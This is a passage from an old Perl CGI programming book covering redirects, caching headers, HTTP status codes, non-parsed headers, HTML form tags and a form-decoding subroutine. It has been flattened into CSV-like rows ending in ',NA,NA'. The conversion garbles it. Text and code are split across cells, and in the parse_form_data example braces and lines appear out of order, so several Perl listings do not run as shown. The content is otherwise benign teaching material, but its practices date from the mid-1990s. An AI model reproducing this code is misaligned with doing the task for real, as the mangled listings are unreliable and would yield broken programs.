#!/usr/local/bin/perl ,NA,NA
$uptime = `/usr/ucb/uptime`; ,NA,NA
"($load_average) = ($uptime =~ /average: ([^,]*)/); ",NA,NA
$load_limit = 10.0; ,NA,NA
"$simple_document = ""/simple.html""; ",NA,NA
"$complex_document = ""/complex.html""; ",NA,NA
if ($load_average >= $load_limit) {,NA,NA
" print ""Location: $simple_document"", ""\n\n""; ",NA,NA
} else {,NA,NA
" print ""Location: $complex_document"", ""\n\n""; ",NA,NA
} ,NA,NA
exit (0);,NA,NA
This program checks the load average of the host system with the ,NA,NA
uptime,NA,NA
 command (see ,NA,NA
"Chapter 1, ",NA,NA
The Common Gateway Interface (CGI),NA,NA
 for an explanation of the regular expression). Depending on ,NA,NA
"the load average, one of two documents is returned; a rich, complicated HTML document with ",NA,NA
"graphics if the system is not ""busy,"" or a simple text-only document otherwise.",NA,NA
And the last thing to note is that you are not limited to returning documents on your own server. You ,NA,NA
"can also return a document (static or virtual) located elsewhere on the Internet, so long as it has a valid ",NA,NA
URL:,NA,NA
"print ""Location: http://www.ora.com"", ""\n\n"";",NA,NA
"For example, this statement will return the home page for O'Reilly and Associates.",NA,NA
The Content-length Header,NA,NA
"The ""Expires"" and ""Pragma""",NA,NA
Headers,NA,NA
"3.6 The ""Expires"" and ""Pragma"" Headers",NA,NA
Most browsers cache (or store internally) the documents you access. This is a very positive feature that saves a ,NA,NA
"lot of resources; the browser doesn't have to retrieve the document every time you look at it. However, it can be a ",NA,NA
slight problem when you are dealing with virtual documents created by CGI programs. Once the browser ,NA,NA
"accesses a virtual document produced by a CGI program, it will cache it. The next time you try to access the ",NA,NA
"same document, the browser will not make a request to the server, but will reload the document from its cache.",NA,NA
"To see the effects of caching, try running the following program:",NA,NA
#!/usr/local/bin/perl ,NA,NA
chop ($current_date = `/bin/date`); ,NA,NA
$script_name = $ENV{'SCRIPT_NAME'}; ,NA,NA
"print ""Content-type: text/html"", ""\n\n""; ",NA,NA
"print ""<HTML>"", ""\n""; ",NA,NA
"print ""<HEAD><TITLE>Effects of Browser Caching</TITLE></HEAD>"", ""\n""; print ",NA,NA
"""<BODY><H1>"", $current_date, ""</H1>"", ""\n""; ",NA,NA
"print ""<P>"", qq|<A HREF=""$script_name"">Click here to run again!</A>|, ""\n""; ",NA,NA
"print ""</BODY></HTML>"", ""\n""; ",NA,NA
exit (0);,NA,NA
"This program displays the current time, as well as a hypertext link to itself. If you click on the link to run the ",NA,NA
"program again, the date and time that is displayed should change, but it does not, because the browser is ",NA,NA
retrieving the cached document. You need to explicitly tell the browser to reload the document if you want to ,NA,NA
run the CGI program again.,NA,NA
"Fortunately, there is a solution to this problem. If you don't want a virtual document to be cached, you can use ",NA,NA
the ,NA,NA
Expires,NA,NA
 and/or ,NA,NA
Pragma,NA,NA
 headers to instruct the client not to cache the document.,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Content-type: text/html"", ""\n""; ",NA,NA
"print ""Pragma: no-cache"", ""\n\n""; ",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
or,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Content-type: text/html"", ""\n""; ",NA,NA
"print ""Expires: Wednesday, 27-Dec-95 05:29:10 GMT"", ""\n\n""; ",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"However, some browsers don't handle these headers correctly, so don't rely on them.",NA,NA
Server Redirection,NA,NA
Status Codes,NA,NA
3.7 Status Codes,NA,NA
"Status codes are used by the HTTP protocol to communicate the status of a request. For example, if a document ",NA,NA
"does not exist, the server returns a ""404"" status code to the browser. If a document has been moved, a ""301"" status ",NA,NA
code is returned.,NA,NA
CGI programs can send status information as part of a virtual document. Here's an arbitrary example that returns ,NA,NA
success if the remote host name is ,NA,NA
bu.edu,NA,NA
", and failure otherwise:",NA,NA
#!/usr/local/bin/perl ,NA,NA
$remote_host = $ENV{'REMOTE_HOST'}; ,NA,NA
"print ""Content-type: text/plain"", ""\n""; ",NA,NA
"if ($remote_host eq ""bu.edu"") {",NA,NA
" print ""Status: 200 OK"", ""\n\n"";",NA,NA
" print ""Great! You are from Boston University!"", ""\n""; ",NA,NA
} else {,NA,NA
" print ""Status: 400 Bad Request"", ""\n\n"";",NA,NA
" print ""Sorry! You need to access this from Boston University!"", ""\n""; ",NA,NA
} ,NA,NA
exit (0);,NA,NA
The ,NA,NA
Status,NA,NA
" header consists of a three-digit numerical status code, followed by a string representing the code. A ",NA,NA
"status value of 200 indicates success, while a value of 400 constitutes a bad request. In addition to these two, there ",NA,NA
"are numerous other status codes you can use for a variety of situations, ranging from an unauthorized or forbidden ",NA,NA
request to internal system errors. ,NA,NA
Table 3.3,NA,NA
 shows a list of some of commonly used status codes.,NA,NA
Table 3.3: HTTP Status Codes,NA,NA
Status Code Message,NA,NA
200 ,NA,NA
Success,NA,NA
204 ,NA,NA
No Response,NA,NA
301 ,NA,NA
Document Moved,NA,NA
401 ,NA,NA
Unauthorized,NA,NA
403 ,NA,NA
Forbidden,NA,NA
404 ,NA,NA
Not Found,NA,NA
500 ,NA,NA
Internal Server Error,NA,NA
501 ,NA,NA
Not Implemented,NA,NA
"For a complete listing of status codes, see: ",NA,NA
http://www.w3.org/hypertext/WWW/Protocols/HTTP/HTRESP.html,NA,NA
"Unfortunately, most browsers do not support all of them.",NA,NA
"The ""No Response"" Code",NA,NA
"One status code that deserves special attention is status code 204, which produces a ""no response."" In other words, ",NA,NA
the browser will not load a new page if your CGI program returns a status code of 204:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Content-type: text/plain"", ""\n""; ",NA,NA
"print ""Status: 204 No Response"", ""\n\n""; ",NA,NA
"print ""You should not see this message. If you do, your browser does"", ""\n""; ",NA,NA
"print ""not implement status codes correctly."", ""\n""; ",NA,NA
exit (0);,NA,NA
"The ""no response"" status code can be used when dealing with forms or imagemaps. For example, if the user enters ",NA,NA
"an invalid value in one of the fields in a form or clicks in an unassigned section of an imagemap, you can return ",NA,NA
this status code to instruct the client to not load a new page.,NA,NA
"The ""Expires"" and ""Pragma""",NA,NA
Headers,NA,NA
Complete (Non-Parsed),NA,NA
Headers,NA,NA
3.8 Complete (Non-Parsed) Headers,NA,NA
"Thus far, we've only seen examples with partial HTTP headers. That is, when all you include is a ",NA,NA
Content-type,NA,NA
" header, the server intercepts the output and completes the header information with ",NA,NA
"header information of its own. The header information generated by the server might include a ""200 ",NA,NA
"OK"" status code (if you haven't overridden it with a ",NA,NA
Status,NA,NA
" header), the date and time, the version of ",NA,NA
"the server, and any other information that it thinks a browser might find useful.",NA,NA
But as we mentioned in Chapter 1 CGI programs can override the header information generated by the ,NA,NA
server by generating a complete HTTP header on its own.,NA,NA
Why go to all the trouble of generating your own header? When your program returns a complete ,NA,NA
"HTTP header, there is no extra overhead incurred by the server. Instead, the output of the CGI ",NA,NA
"program goes directly to the client, as shown in ",NA,NA
Figure 3.2,NA,NA
. This may mean faster response time for,NA,NA
"the user. However, it also means you need to be especially careful when generating your own headers, ",NA,NA
since the server won't be able to circumvent any errors.,NA,NA
Figure 3.2: Partial and complete headers,"[Graphic: 
  
 Figure 3-2]",NA
How does the server know if the CGI program has output a partial or a complete HTTP header ,NA,NA
"without ""looking"" at it? It depends on which server you use. On the NCSA and CERN servers, ",NA,NA
"programs that output complete headers must start with the ""nph-"" prefix (e.g., ",NA,NA
nph-test.pl,NA,NA
"), which ",NA,NA
stands for Non-Parsed Header.,NA,NA
The following example illustrates the usefulness of creating an NPH script:,NA,NA
#!/usr/local/bin/perl,NA,NA
$server_protocol = $ENV{'SERVER_PROTOCOL'};,NA,NA
$server_software = $ENV{'SERVER_SOFTWARE'};,NA,NA
"print ""$server_protocol 200 OK"", ""\n"";",NA,NA
"print ""Server: $server_software"", ""\n"";",NA,NA
"print ""Content-type: text/plain"", ""\n\n"";",NA,NA
"print ""OK, Here I go. I am going to count from 1 to 50!"", ""\n"";",NA,NA
$| = 1;,NA,NA
for ($loop=1; $loop <= 50; $loop++) {,NA,NA
" print $loop, ""\n"";",NA,NA
 sleep (2);,NA,NA
},NA,NA
"print ""All Done!"", ""\n"";",NA,NA
exit (0);,NA,NA
"When you output a complete header, you should ",NA,NA
at least,NA,NA
 return header lines consisting of the HTTP ,NA,NA
"protocol revision and the status of the program, the server name/version (e.g., NCSA/1.4.2), and the ",NA,NA
MIME content type of the data.,NA,NA
You can run this program by opening the URL to:,NA,NA
http://your.machine/cgi-bin/nph-count.pl,NA,NA
"When you run this CGI script, you should see the output in ""real time"": the client will display the ",NA,NA
"number, wait two seconds, display the next number, etc.",NA,NA
Now remove the complete header information (except for ,NA,NA
Content-type,NA,NA
"), change the name to ",NA,NA
count.pl ,NA,NA
(instead of ,NA,NA
nph-count.pl,NA,NA
"), and run it again. What's the difference? You will no longer see the output in ",NA,NA
"""real time""; the client will display the entire document at once.",NA,NA
Status Codes,NA,NA
Forms and CGI,NA,NA
4. Forms and CGI,"Contents: 
  
 HTML Tags 
  
 Sending Data to the Server
  
 Designing Applications Using Forms in Perl
  
 Decoding Forms in Other Languages
  
 As we discussed briefly in 
 Chapter 4, 
 Forms and CGI
  forms are generally used for two purposes: data collection and
  
 interactive communication. You can conduct surveys or polls, and present registration or online ordering information 
 through the use of forms. They are also used to create an interactive medium between the user and the Web server. For 
 example, a form can ask the user to select a document out of a menu, whereby the server returns the chosen document.
  
 The main advantage of forms is that you can use them to create a front end for numerous gateways (such as databases or 
 other information servers) that can be accessed by any client without worrying about platform dependency. On the other 
 hand, there are some shortcomings with the current implementation:
  
 G 
  
 G 
  
 The interface does not support any data types besides the general ""text"" type. The next HTML specification could 
 contain other data types, such as ""int,"" ""date,"" ""float,"" and ""url.""
  
 User input cannot be checked on the client side; the user has to press the Submit button and the CGI program on the 
 server side has to make sure the input is valid.
  
 This chapter covers:
  
 G   
 The HTML tags for writing forms
  
 G   
 How form data is sent to the server
  
 G 
 Examples of designing form-based CGI applications, both in Perl and other languages",NA
4.1 HTML Tags,"A form consists of two distinct parts: the HTML code and the CGI program. HTML tags create the visual representation of 
 the form, while the CGI program decodes (or processes) the information contained within the form. Before we look at how 
 CGI programs process form information, let's understand how a form is created. In this section, we'll cover the form tags 
 and show examples of their use.",NA
The FORM Tag,"Here is the beginning of a simple form:
  
 <FORM ACTION=""/cgi-bin/program.pl"" METHOD=""POST"">
  
 The 
 <FORM>
  tag starts the form. A document can consist of multiple forms, but forms cannot be nested; a form cannot be 
 placed inside another form.
  
 The two attributes within the 
 <FORM>
  tag ( ACTION and METHOD) are very important. The ACTION attribute specifies 
 the URL of the CGI program that will process the form information. You are not limited to using a CGI program on your 
 server to decode form information; you can specify a URL of a remote host if a program that does what you want is 
 available elsewhere.
  
 The METHOD attribute specifies how the server will send the form information to the program. POST sends the data",NA
Text and Password Fields,"Most form elements are implemented using the 
 <INPUT>
  tag. The 
 TYPE
  attribute to 
 <INPUT>
  determines what type of 
 input is being requested. Several different types of elements are available: text and password fields, radio buttons, and 
 checkboxes. The following lines are examples of simple text input.
  
 Name: <INPUT TYPE=""text"" NAME=""user"" SIZE=40><BR>
  
 Age: <INPUT TYPE=""text"" NAME=""age""  SIZE=3 MAXLENGTH=3><BR>
  
 Password: <INPUT TYPE=""password"" NAME=""pass"" SIZE=10><BR>
  
 In this case, two text fields and one password field are created using the ""text"" and ""password"" arguments, respectively. The 
 password field is basically the same as a text field except the characters entered will be displayed as asterisks or bullets. If 
 you skip the TYPE attribute, a text field will be created by default.
  
 The NAME attribute defines the name of the particular input element. It is not displayed by the browser, but is used to label 
 the data when transferred to the CGI program. For example, the first input field has a NAME=""user"" attribute. If someone 
 types ""andy"" into the first input field, then part of the data sent by the browser will read:
  
  user=andy 
  
 The CGI program can later retrieve this information (as we talked about briefly in 
 Chapter 2, 
 Input to the Common Gateway
  
 Interface
 , and will discuss in more detail later in this chapter) and parse it as needed.
  
 The optional VALUE attribute can be used to insert an initial ""default"" value into the field. This string can be overwritten 
 by the user.
  
 Other optional attributes are SIZE and MAXLENGTH. SIZE is the physical size of the input element; the field will scroll if 
 the input exceeds the size. The default size is 20 characters. MAXLENGTH defines the maximum number of characters that 
 will be accepted by the browser; by default there is no limit.
  
 In the following line, the initial text field size is expanded to 40 characters, the maximum length is specified as 40 as well 
 (so the field will not scroll), and the initial value string is ""Shishir Gundavaram.""
  
 <INPUT TYPE=""text""  NAME=""user""  SIZE=40 MAXLENGTH=40 VALUE=""Shishir Gundavaram""  >
  
 Before we move on, there is still another type of text field. It is called a ""hidden"" field and allows you to store information 
 in the form. The client will not display the field. For example:
  
 <INPUT TYPE=""hidden"" NAME=""publisher"" VALUE=""ORA"">
  
 Hidden fields are most useful for transferring information from one CGI application to another. See 
 Chapter 8, 
 Multiple
  
 Form Interaction
 , for an example of using hidden fields.",NA
Submit and Reset Buttons,"Two more important ""types"" of the <INPUT> tag are Submit and Reset.
  
 <INPUT TYPE=""submit"" VALUE=""Submit the form""> 
 <INPUT TYPE=""reset""  VALUE=""Clear all fields"">
  
 Nearly all forms offer Submit and Reset buttons. The Submit button sends all of the form information to the CGI program",NA
Radio Buttons and Checkboxes,"Radio buttons and checkboxes are typically used to present the user with several options.
  
 A checkbox creates square buttons (or boxes) that can be toggled on or off. In the example below, it is used to create four 
 square checkboxes.",NA
Menus and Scrolled Lists,"Menus and scrolled lists are generally used to present a large number of options or choices to the user. The following is an 
 example of a menu:
  
 <FORM ACTION=""/cgi-bin/program.pl"" METHOD=""POST""> 
 Choose a method of payment: 
  
 <SELECT NAME=""card"" SIZE=1> 
  
 <OPTION SELECTED>Master Card 
  
 <OPTION>Visa 
  
 <OPTION>American Express 
  
 <OPTION>Discover 
  
 </SELECT>
  
 Option menus and scrolled lists are created using the SELECT tag, which has an opening and a closing tag. The SIZE 
 attribute determines if a menu or a list is displayed. A value of 1 produces a menu, and a value greater than 2 produces a 
 scrolled list, in which case the number represents the number of items that will be visible at one time.
  
 A selection in a menu or scrolled list is added using the OPTION tag. The SELECTED attribute to OPTION allows you to 
 set a default selection.
  
 Now for an example of a scrolled list (a list with a scrollbar):
  
 <SELECT NAME=""books"" SIZE=3 MULTIPLE> 
  
 <OPTION SELECTED>TCP/IP Network Administration 
 <OPTION>Linux Network Administrators Guide 
 <OPTION>DNS and BIND 
  
 <OPTION>Computer Security Basics 
  
 <OPTION>System Performance Tuning 
  
 </SELECT> 
  
 </FORM>
  
 The example above creates a scrolled list with three visible items and the ability to select multiple options. (The 
 MULTIPLE attribute specifies that more than one item can be selected.)
  
 Figure 4.3
  shows what the menus and scrolled list look like.
  
 Figure 4.3: Form with menus and scrolled lists",NA
Multiline Text Fields,"You must have seen numerous guestbooks on the Web that ask for your comments or opinions, where you can enter a lot of 
 information. This is accomplished by using a multiline text field. Here is an example:
  
  <FORM ACTION=""/cgi-bin/program.pl"" METHOD=""POST""> 
 <TEXTAREA ROWS=10 COLS=40 NAME=""comments""> 
  
 </TEXTAREA>
  
 This creates a scrolled text field with 10 rows and 40 columns. (10 rows and 40 columns designates only the visible text 
 area; the text area will scroll if the user types further).
  
 Notice that you need both the beginning 
 <TEXTAREA>
  and the ending 
 </TEXTAREA>
  tags. You can enter default 
 information between these tags.
  
 <TEXTAREA ROWS=10 COLS=40 NAME=""comments_2""> 
 This is some default information. 
  
 Some more...
  
 And some more...
  
 </TEXTAREA> 
  
 </FORM>
  
 You have to remember that newlines (or carriage returns) are not ignored in this field--unlike HTML. In the preceding 
 example, the three separate lines will be displayed just as you typed them.
  
 The multiline examples will be rendered by the browser as shown in 
 Figure 4.4
 .
  
 Figure 4.4: Form with multiline text input",NA
Quick Reference to Form Tags ,"Before we get going, here's a short list of all the available form tags: Table 
 4.1: Form Tags
  
 Form Tag 
  
 <FORM ACTION=""/cgi-bin/prog.pl"" METHOD=""POST""> 
  
 <INPUT TYPE=""text"" NAME=""name"" VALUE=""value"" SIZE=""size""> 
 <INPUT TYPE=""password"" NAME=""value"" VALUE=""value"" SIZE=""size""> 
 <INPUT TYPE=""hidden"" NAME=""name"" VALUE=""value""> 
  
 <INPUT TYPE=""checkbox"" NAME=""name"" VALUE=""value""> 
  
 <INPUT TYPE=""radio"" NAME=""name"" VALUE=""value""> 
  
 <SELECT NAME=""name"" SIZE=1> <OPTION SELECTED>One <OPTION>Two : 
 </SELECT> 
  
 <SELECT NAME=""name"" SIZE=n MULTIPLE> 
  
 <TEXTAREA ROWS=yy COLS=xx NAME=""name""> . . </TEXTAREA> 
  
 <INPUT TYPE=""submit"" VALUE=""Message!""> <INPUT TYPE=""submit"" 
 NAME=""name"" VALUE=""value""> <INPUT TYPE=""image"" SRC=""/image"" 
 NAME=""name"" VALUE=""value""> 
  
 <INPUT TYPE=""reset"" VALUE=""Message!""> 
  
 </FORM>
  
 Description 
  
 Start the form 
 Text field 
  
 Password field 
 Hidden field 
  
 Checkbox 
  
 Radio button
  
 Menu
  
 Scrolled list 
  
 Multiline text fields
  
 Submit buttons
  
 Reset button 
 Ends form
  
  
  
 Complete (Non-Parsed)
  
 Headers
  
  
  
 Sending Data to the Server",NA
4.2 Sending Data to the Server,"Earlier in this chapter we mentioned the 
 application/x-www-form-urlencoded
  MIME type. The browser uses this MIME 
 type to encode the form data.
  
 First, each form element's name--specified by the NAME attribute--is equated with the value entered by the user to create 
 a key-value pair. For example, if the user entered ""30"" when asked for the age, the key-value pair would be (age=30). 
 Each key-value pair is separated by the "" &"" character.
  
 Second, since the variable names for the form element and the actual form data are standard text, it is possible this text 
 could consist of characters that will confuse browsers. To prevent possible errors, the encoding scheme translates all 
 ""special"" characters to their corresponding hexadecimal codes. These ""special"" characters include control characters and 
 certain alphanumeric symbols. For example, the string ""Thanks for the help!"" would be converted to 
  
 ""Thanks%20for%20the%20help%21"". This process is repeated for each key-value pair to create a query string.[1]
  
 [1] Before the forms interface, the only way you could retrieve user information was through a search field 
 (i.e., <ISINDEX>), which passed the data to the server with spaces converted to plus signs ( ""+"").
  
 For text and password fields, the user input will represent the value. If no information was entered, the key-value pair will 
 be sent anyway, with the value left blank (i.e., ""name="").
  
 For radio buttons and checkboxes, the VALUE attribute represents the value when the button element is checked. If no 
 VALUE is specified, the value defaults to ""on."" An unchecked checkbox will not be sent as a key-value pair; it will be 
 ignored.
  
 The CGI program then has to ""decode"" this information in order to access the form data. The encoding scheme is the same 
 for both GET and POST.",NA
GET vs. POST,"There are two methods for sending form data: GET and POST. The main difference between these methods is the way in 
 which the form data is passed to the CGI program. If the GET method is used, the query string is simply appended to the 
 URL of the program when the client issues the request to the server. This query string can then be accessed by using the 
 environment variable QUERY_STRING. Here is a sample GET request by the client, which corresponds to the first form 
 example:
  
 GET /cgi-bin/program.pl?user=Larry%20Bird&age=35&pass=testing HTTP/1.0 
 Accept: www/source
  
 Accept: text/html
  
 Accept: text/plain 
  
 User-Agent: Lynx/2.4 libwww/2.14
  
 As we discussed in Chapter 2, the query string is appended to the URL after the ""?"" character.[2] The server then takes this 
 string and assigns it to the environment variable QUERY_STRING.
  
 [2] The information in the password field is not encrypted in any way; it is plain text. You have to be very 
 careful when asking for sensitive data using the password field. If you want security, please use server 
 authentication.
  
 The GET method has both advantages and disadvantages. The main advantage is that you can access the CGI program with 
 a query without using a form. In other words, you can create "" canned queries."" Basically, you are passing parameters",NA
Understanding the Decoding Process,"In order to access the information contained within the form, a decoding protocol must be applied to the data. First, the 
 program must determine how the data was passed by the client. This can be done by examining the value in the 
 environment variable REQUEST_METHOD. If the value indicates a GET request, either the query string or the extra path 
 information must be obtained from the environment variables. On the other hand, if it is a POST request, the number of 
 bytes specified by the CONTENT_LENGTH environment variable must be read from standard input. The algorithm for 
 decoding form data follows:
  
 1.  Determine request protocol (either GET or POST) by checking the REQUEST_METHOD environment variable.
  
 2.  If the protocol is GET, read the query string from QUERY_STRING and/or the extra path information from",NA
4.3 Designing Applications Using Forms in Perl,NA,NA
Here is a simple form that prompts for a name:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Testing a Form</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Testing a Form</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/greeting.pl"" METHOD=""POST""> ",NA,NA
"Enter your full name: <INPUT TYPE=""text"" NAME=""user"" SIZE=60><BR> ",NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML>,NA,NA
The form consists of an input field and the Submit and Reset buttons.,NA,NA
"Now, here is the Perl program to decode the information and print a greeting:",NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""shishir\@bu.edu""; ",NA,NA
&parse_form_data (*simple_form);,NA,NA
The subroutine ,NA,NA
parse_form_data,NA,NA
" decodes the form information. Here, the main program passes the subroutine a ",NA,NA
reference to a variable named ,NA,NA
simple_form,NA,NA
. The subroutine treats it as an associative array (a common data type ,NA,NA
in Perl) and fills it with key-value pairs sent by the browser. We will see how ,NA,NA
parse_form_data,NA,NA
 works later; the ,NA,NA
important thing right now is that we can easily get the name of the user entered into the form.,NA,NA
"You may find it confusing, trying to track what happens to the information entered by the user. The user fills out ",NA,NA
"the forms, and the browser encodes the information into a string of key-value pairs. If the request method is ",NA,NA
"POST, the server passes the information as standard input to the CGI program. If the request method is GET, the ",NA,NA
"server stores the information in an environment variable, QUERY_STRING. In either case, ",NA,NA
parse_form_data,NA,NA
" retrieves the data, breaks it into key-value pairs, and stores it into an associative array. The ",NA,NA
main program can then extract any information that you want.,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
$user = $simple_form{'user'}; ,NA,NA
if ($user) {,NA,NA
" print ""Nice to meet you "", $simple_form{'user'}, ""."", ""\n"";",NA,NA
" print ""Please visit this Web server again!"", ""\n""; ",NA,NA
} else {,NA,NA
" print ""You did not enter a name. Are you shy?"", ""\n"";",NA,NA
" print ""But, you are welcome to visit this Web server again!"", ""\n""; ",NA,NA
} ,NA,NA
exit(0);,NA,NA
The main program now extracts the user name from the array that ,NA,NA
parse_form_data,NA,NA
 filled in. If you go back and ,NA,NA
"look at the form, you'll find it contained an <INPUT> tag with a NAME attribute of ""user."" The value ""user"" ",NA,NA
"becomes the key in the array. That is why this program checks for the key ""user"" and extracts the value, storing it ",NA,NA
"in a variable that also happens to be named ""user.""",NA,NA
The conditional checks to see if the user entered any information. One of two possible greetings is printed out. ,NA,NA
It is always very important to check the form values to make sure there is no erroneous information. For ,NA,NA
"example, if the user entered ""John Doe"" the output would be:",NA,NA
Nice to meet you John Doe.,NA,NA
Please visit this Web server again!,NA,NA
"On the other hand, if the user did not enter any data into the input field, the response would be:",NA,NA
You did not enter a name. Are you shy?,NA,NA
"But, you are welcome to visit this Web server again!",NA,NA
"Now, let's look at the core of this program: the subroutine that does all of the work.",NA,NA
sub parse_form_data ,NA,NA
{,NA,NA
 local (*FORM_DATA) = @_;,NA,NA
" local ( $request_method, $query_string, @key_value_pairs,",NA,NA
" $key_value, $key, $value);",NA,NA
"The local variable FORM_DATA is a reference (or, in Perl terms, a glob) to the argument passed to the ",NA,NA
"subroutine. In our case, FORM_DATA is a reference to the ",NA,NA
simple_form,NA,NA
 associate array. Why did we pass a ,NA,NA
reference with an asterisk (*,NA,NA
simple_form,NA,NA
) instead of just naming the array (,NA,NA
simple_form,NA,NA
)? The reasoning will be ,NA,NA
"a little hard to follow if you are not familiar with programming, but I will try to explain. If I passed ",NA,NA
simple_form ,NA,NA
"without the asterisk, the subroutine would not be able to pass information back to the main program in that array ",NA,NA
"(it could return it in another array, but that is a different matter). This would be pretty silly, since the array is ",NA,NA
empty to start with and the only purpose of the subroutine is to fill it.,NA,NA
"As you can see, the first thing I do is create another reference to the array, FORM_DATA",NA,NA
.,NA,NA
 This means that ,NA,NA
FORM_DATA and ,NA,NA
simple_form,NA,NA
" share the same memory, and any data I put in FORM_DATA can be extracted ",NA,NA
by the main program from ,NA,NA
simple_form,NA,NA
. You will see that the subroutine does all further operations on ,NA,NA
FORM_DATA; this is the same as doing them on ,NA,NA
simple_form,NA,NA
.,NA,NA
Now let's continue with the rest of this subroutine.,NA,NA
 $request_method = $ENV{'REQUEST_METHOD'};,NA,NA
" if ($request_method eq ""GET"") {",NA,NA
 $query_string = $ENV{'QUERY_STRING'};,NA,NA
" } elsif ($request_method eq ""POST"") {",NA,NA
" read (STDIN, $query_string, $ENV{'CONTENT_LENGTH'}); } ",NA,NA
else {,NA,NA
" &return_error (500, ""Server Error"",",NA,NA
" ""Server uses unsupported method"");",NA,NA
 },NA,NA
"The request method is obtained. If it is a GET request, the query string is obtained from the environment ",NA,NA
variable and stored in ,NA,NA
query_string,NA,NA
". However, if it is a POST request, the amount of data sent by the client is ",NA,NA
read from STDIN with the ,NA,NA
read,NA,NA
 command and stored in ,NA,NA
query_string,NA,NA
. If the request protocol is not one of the ,NA,NA
"two discussed earlier, an error is returned. Notice the ",NA,NA
return_error,NA,NA
" subroutine, which is used to return an error ",NA,NA
"to the browser. The three parameters represent the status code, the status keyword, and the error message, ",NA,NA
respectively.,NA,NA
" @key_value_pairs = split (/&/, $query_string); ",NA,NA
foreach $key_value (@key_value_pairs) {,NA,NA
" ($key, $value) = split (/=/, $key_value); ",NA,NA
$value =~ tr/+/ /;,NA,NA
" $value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
"Since the client puts ampersands between key-value pairs, the ",NA,NA
split,NA,NA
 command specifies an ampersand as the ,NA,NA
delimiter. The result is to fill the array ,NA,NA
key_value_pairs,NA,NA
" with entries, where each key-value pair is stored in a ",NA,NA
"separate array element. In the loop, each key-value pair is again split into a separate key and value, where an ",NA,NA
equal sign is the delimiter. The ,NA,NA
tr,NA,NA
" (for translate) operator replaces each ""+"" with the space character. The regular ",NA,NA
"expression within the (for substitute) operator looks for an expression that starts with the ""%"" sign and is ",NA,NA
followed by two characters. These characters represent the hexadecimal value. The parentheses in the regexp ,NA,NA
instruct Perl to store these characters in a variable ($1). The ,NA,NA
pack,NA,NA
 and ,NA,NA
hex,NA,NA
 commands convert the value stored in ,NA,NA
"$1 to an ASCII equivalent. Finally, the ""e"" option evaluates the second part of the substitute command--the ",NA,NA
"replacement string--as an expression, and the ""g"" option replaces all occurrences of the hexadecimal string. If ",NA,NA
"you had remained unconvinced up to now of Perl's power as a language for CGI, this display of text processing ",NA,NA
(similar to what thousands of CGI programmers do every day) should change your mind.,NA,NA
},NA,NA
 },NA,NA
 if (defined($FORM_DATA{$key})) {,NA,NA
" $FORM_DATA{$key} = join (""\0"", $FORM_DATA{$key}, $value);",NA,NA
 } else {,NA,NA
 $FORM_DATA{$key} = $value;,NA,NA
 },NA,NA
"When multiple values are selected in a scrolled list and submitted, each value will contain the same variable ",NA,NA
"name. For example, if you choose ""One"" and ""Two"" in a scrolled list with the variable name ""Numbers,"" the ",NA,NA
query string would look like:,NA,NA
Numbers=One&Numbers=Two,NA,NA
The conditional statement above is used in cases like these. If a variable name exists--indicating a scrolled list ,NA,NA
"with multiple options--each value is concatenated with the ""\0"" separator. Now, here is the ",NA,NA
return_error ,NA,NA
subroutine:,NA,NA
sub return_error ,NA,NA
{,NA,NA
" local ($status, $keyword, $message) = @_;",NA,NA
" print ""Content-type: text/html"", ""\n"";",NA,NA
" print ""Status: "", $status, "" "", $keyword, ""\n\n"";",NA,NA
 print <<End_of_Error; ,NA,NA
<HTML>,NA,NA
<HEAD>,NA,NA
 <TITLE>CGI Program - Unexpected Error</TITLE>,NA,NA
</HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>$keyword</H1> ,NA,NA
<HR>$message<HR> ,NA,NA
Please contact $webmaster for more information.,NA,NA
</BODY> ,NA,NA
</HTML> ,NA,NA
End_of_Error,NA,NA
 exit(1); ,NA,NA
},NA,NA
"This subroutine can be used to return an error status. Since the program handles both GET and POST queries, ",NA,NA
you can send a query to it directly:,NA,NA
"<A HREF=""/cgi-bin/program.pl?user=John+Doe"">Hello</A>",NA,NA
The program will display the same output as before.,NA,NA
Combining Graphics and Queries,NA,NA
"It's simple to return graphical output when you process a form--in fact you can ""bundle"" the whole program up ",NA,NA
"in an image, using the HTML tag IMG. Let's see how to do this. First, we'll start with a form that's just a little ",NA,NA
more complicated than the previous form:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Color Text</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Color Text</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/gd_text.pl"" METHOD=""POST""> ",NA,NA
This form makes it possible to display color text and messages.<BR> ,NA,NA
What message would you like to display: <BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""message"" SIZE=60><BR> ",NA,NA
What is your favorite color: ,NA,NA
"<SELECT NAME=""color"" SIZE=1> ",NA,NA
<OPTION SELECTED>Red ,NA,NA
<OPTION>Blue ,NA,NA
<OPTION>Green ,NA,NA
<OPTION>Yellow ,NA,NA
<OPTION>Orange ,NA,NA
<OPTION>Purple ,NA,NA
<OPTION>Brown ,NA,NA
<OPTION>Black ,NA,NA
</SELECT> ,NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY>,NA,NA
 </HTML>,NA,NA
"This displays a form with one text field and a menu, along with the customary Submit and Reset buttons. The ",NA,NA
"form and the program allow you to display color text in the browser's window. For example, if you want a red",NA,NA
"headline in your document, you can fill out the form or access the program directly:",NA,NA
